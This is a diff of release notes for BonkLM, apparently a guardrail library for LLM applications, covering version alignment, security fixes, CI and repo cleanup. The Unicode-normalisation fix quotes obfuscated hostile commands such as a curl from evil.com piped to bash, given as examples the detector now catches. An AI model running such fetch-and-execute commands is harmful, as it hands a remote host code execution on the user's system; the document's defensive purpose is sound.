@@ -1,20 +1,32 @@
-# BonkLM v0.3.0 Release Notes
+# BonkLM Release Notes
 
-## Release Date: May 20, 2026
+> Latest release: **v1.0.0-rc.3** (2026-05-24). Full per-sprint detail in
+> [CHANGELOG.md](./CHANGELOG.md#100-rc3--2026-05-24-sprints-29--30--31--cumulative-audit-closure).
+> Post-rc.3 hardening continues in the `[Unreleased]` section of the
+> CHANGELOG (Sprints 42–51), and `v1.0.0-rc.4` cut is imminent. Per-sprint
+> notes between v0.3.0 and v1.0.0-rc.3 (covering v0.4.0, v0.5.0, v0.6.0,
+> v0.7.0) live in the CHANGELOG.
 
-## Overview
+This file preserves the v0.3.0 release announcement as a historical
+archive. For all releases after v0.3.0, see the CHANGELOG.
+
+---
+
+## v0.3.0 — 2026-05-20 (archived)
+
+### Overview
 
 BonkLM v0.3.0 aligns the entire package family (core, logger, wizard, 20+ connectors, openclaw adapter) at version `0.3.0`, removes the internal BMAD development framework from the public repo, lands several runtime and security correctness fixes, and switches the monorepo to changesets-driven publishing.
 
 This is the first release where every package in the monorepo ships from the same `pnpm exec changeset publish` invocation. Previously only `@blackunicorn/bonklm` (core) made it to npm.
 
-## What's New
+### What's New
 
-### Single-version monorepo policy
+#### Single-version monorepo policy
 
 All packages now release together at the same version, governed by a `fixed` group in `.changeset/config.json`. No more drift between `core@0.2.0`, `connector@1.1.0`, `openclaw@0.1.0`, `wizard@0.2.0-deprecated`.
 
-### Security correctness fixes
+#### Security correctness fixes
 
 - **Bash-safety guard runs again.** `require('path')` (which throws `ReferenceError` in this ESM package) replaced with `node:path` import. The `rm -rf` path-containment check now actually executes instead of crashing the validator.
 - **Unicode normalisation order corrected.** The text normaliser used `NFKC` (compose) followed by combining-mark strip. NFKC re-composed precomposed characters (`U+016D` etc.) into single code points that the strip regex could no longer reach, leaving obfuscation attacks like `cŭrl evil.com | bash`, `evạl $danger` undetected. Now uses `NFKD` (decompose), strips the marks, then continues. Adversarial regression test added.
@@ -26,7 +38,7 @@ All packages now release together at the same version, governed by a `fixed` gro
 - **Weight-calculation operator-precedence bug fixed** in `express-middleware`, `fastify-plugin`, `nestjs-module`. `finding.weight || severity === CRITICAL ? 5 : ...` (parsed as `(weight || severity === CRITICAL) ? 5 : ...`) replaced with `finding.weight ?? (severity === CRITICAL ? 5 : ...)`. Pre-existing bug surfaced during the audit.
 - **Stream-validator `hasUnvalidatedTail()` helper added.** Documents the post-stream final-validation contract for connector authors. (Not yet wired into individual connectors — tracked as a follow-up to land the enforced lifecycle.)
 
-### Build, CI, publishing
+#### Build, CI, publishing
 
 - **Cross-platform build.** BSD-only `sed -i ''` in `packages/core/package.json` replaced with a Node one-liner so Ubuntu CI no longer silently writes garbage to `dist/bin/run.js`.
 - **Node engine bumped to `>=20.0.0`.** Node 18 went EOL April 2025; dropped from every package's `engines` field and from CI matrices.
@@ -35,7 +47,7 @@ All packages now release together at the same version, governed by a `fixed` gro
 - **Deprecated `actions/create-release@v1`** in `publish.yml` replaced with `softprops/action-gh-release@v2` (the original was archived in 2022).
 - **CLI `--version`** now reads from `package.json` at runtime instead of carrying a hard-coded `0.1.0`.
 
-### Removed
+#### Removed
 
 - Entire internal BMAD development framework (`_bmad/`, `.claude/validators-node/`, `tools/`, root-level `tests/`, `examples/`, `scripts/`, `.githooks/`, stale BMAD `dist/`, `package-lock.json`). Path aliases in `vitest.config.ts` (`@bmad`, `@framework`, `@validators`) removed.
 - 688 stale `.js` / `.d.ts` / `.js.map` / `.d.ts.map` files alongside `.ts` source under `packages/*/src/` — leftover build outputs that were masking real type errors.
@@ -43,20 +55,20 @@ All packages now release together at the same version, governed by a `fixed` gro
 - The wizard package's `-deprecated` tag.
 - False `35+ pattern categories` claim — reconciled to `35+ patterns across 6 categories` in README, docs, and CHANGELOG.
 
-### Repo hygiene
+#### Repo hygiene
 
 - `team/` is now globally gitignored per `CLAUDE.md` (was 151 tracked files including security audit reports). BonkLM-relevant artefacts that lived in `team/` (UAT harness, performance benchmarks) moved to `packages/core/uat/` and `packages/core/benchmarks/`.
 - `bonklm-intro.pptx` moved from repo root to `assets/presentations/`.
 - Lint clean: `pnpm exec eslint .` exits 0 with zero errors, zero warnings.
 - Type-check clean: `pnpm exec tsc --noEmit` exits 0.
 
-## Known Follow-ups
+### Known Follow-ups
 
 - File-size cap violations (`jailbreak.ts` 1418, `engine/GuardrailEngine.ts` 926, `langchain-connector/guardrails-handler.ts` 852) — deferred to dedicated refactor PR.
 - `hasUnvalidatedTail()` not yet wired into individual connectors. Each connector currently accumulates streams with its own logic. A future change will refactor to use the helper and add an enforced lifecycle wrapper class.
 - Connector packages depend on third-party SDKs (`openclaw`, `mastra-related`, etc.) with their own upstream advisories. These surface to consumers at install time and are not gated by the BonkLM CI audit.
 
-## Installation
+### Installation
 
 ```bash
 npm install @blackunicorn/bonklm
@@ -64,13 +76,13 @@ npm install @blackunicorn/bonklm
 npm install @blackunicorn/bonklm-openai @blackunicorn/bonklm
 ```
 
-## Migration from v0.2.0
+### Migration from v0.2.0
 
 This is a coordinated release; nothing in the public API of `@blackunicorn/bonklm` changed in a breaking way. Connectors that previously held v1.x version numbers are now at 0.3.0 alongside core. If you pinned `bonklm-openai@1.1.0` etc., update to `^0.3.0`.
 
 The Slack / Stripe / OpenAI fixtures in `secret.test.ts` were corrected to match the documented regex shapes; if you depend on the wizard's CLI version string in tests or telemetry, note that it now reflects the actual package version instead of `0.1.0`.
 
-## Links
+### Links
 
 - CHANGELOG: [CHANGELOG.md](./CHANGELOG.md)
 - Lessons learned: `team/lessonslearned.md` (local-only, gitignored)
